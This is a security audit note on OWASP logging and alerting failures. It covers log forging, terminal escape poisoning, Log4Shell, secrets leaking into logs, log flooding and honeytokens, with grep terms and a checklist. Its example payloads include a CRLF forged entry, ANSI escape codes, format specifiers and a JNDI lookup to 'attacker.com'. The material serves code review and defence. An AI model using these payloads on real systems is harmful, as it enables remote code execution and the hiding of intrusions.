# Security Logging & Alerting Failures (Log Injection/Tampering)

> **Context:** Without logging, continuous monitoring, and alerting, breaches cannot be detected. Conversely, logging too much sensitive data or allowing attackers to inject logs compromises the forensic trail.

**Tags:** #medium #logging #alerting #log-forging #log4shell #anti-forensics
**OWASP:** A09:2025 Security Logging & Alerting Failures
**CVSS Base:** 5.3 (Medium) — 9.8 (Critical → if Log4Shell RCE)

---

## 1. CRLF Log Injection (Log Forging)
- **Scenario:** User input is written directly into application logs without sanitization of control characters.
- **Tactic:** The attacker submits a malicious username: `admin\r\n[INFO] 2026-04-20 User admin successfully logged in`.
- **Detonation:** The log file reads as two separate, legitimate-looking entries. The attacker completely subverts the audit trail to frame another user or hide their tracks.
- **`grep_search`:** `logger.info(`, `console.log(`, `logging.getLogger`. 

## 2. Terminal Escape Sequences (Log Poisoning)
- **Scenario:** The application logs input that administrator terminals will `cat` or `tail`.
- **Tactic:** The attacker injects ANSI escape sequences (e.g., `\e[2J` to clear the screen, or `\b` backspaces).
- **Detonation:** When the Sysadmin reviews the logs in a terminal, the malicious entry erases itself or manipulates the terminal output to hide the preceding attack logs.
- **`grep_search`:** Inspect if loggers sanitize `\e`, `\x1b`, or `\033`.

## 3. Log4Shell & Format String Attacks
- **Scenario:** The logging library itself parses and evaluates the logged strings (e.g., Log4j, or C/C++ `printf` style logging).
- **Tactic:** The attacker inputs `${jndi:ldap://attacker.com/a}` or `%x %n`.
- **Detonation:** The logger attempts to resolve the string, leading to Remote Code Execution (Log4Shell) or memory corruption/read.
- **`grep_search`:** `log4j`, `logger.error(user_input)` without parameterization.

## 4. Sensitive Data Leakage in Logs (PII/Secrets)
- **Scenario:** Global error handlers or request loggers indiscriminately dump `req.body`, `req.headers`, or `Exception` stack traces.
- **Tactic:** Attackers trigger specific errors during authentication or payment flows.
- **Detonation:** Passwords, Session Tokens, or Credit Card numbers are written to Splunk, Datadog, or local log files, which are often accessible to a wider internal audience than the production database.
- **`grep_search`:** `JSON.stringify(req.body)`, `logger.error(err.stack)`.

## 5. Log Overconsumption (DoS via Logs)
- **Scenario:** The application logs large payloads indiscriminately on errors.
- **Tactic:** Attacker sends massive payloads (e.g., 10MB JSON) in a loop to trigger errors.
- **Detonation:** The disk fills up (`/var/log/`), causing a Denial of Service, or the excessive logging flushes out the actual attack logs through log rotation.

## 6. [NEW] Alerting Failures & Missing Honeytokens (OWASP 2025 Focus)
- **Scenario:** High-value transactions, failed logins, or internal enumeration trigger logs but **no alerts**, delaying breach response by years.
- **Tactic (Honeytokens):** The application should inject "honeytokens" (fake users, fake API keys) into the database. Since they are never used in normal business, any access/login attempt using them generates an immediate high-priority alert with zero false positives.
- **`grep_search`:** Search for SOC alerting integrations (e.g., PagerDuty, Slack webhooks) and verify if excessive 401/403s trigger them.

## Strategic Checklist
1. [ ] Trace all paths where unfiltered user input reaches the logging engine.
2. [ ] Verify if the logging library escapes `\r`, `\n`, `\t` and ANSI codes.
3. [ ] Check log configurations for size limits and rotation metrics.
4. [ ] Ensure a `Redactor` or `Masking` utility is applied to strip Passwords/Tokens before logging.

---
*Tags: #log-injection #anti-forensics #log-forging #log4shell #pii-leakage #shiva-vault*
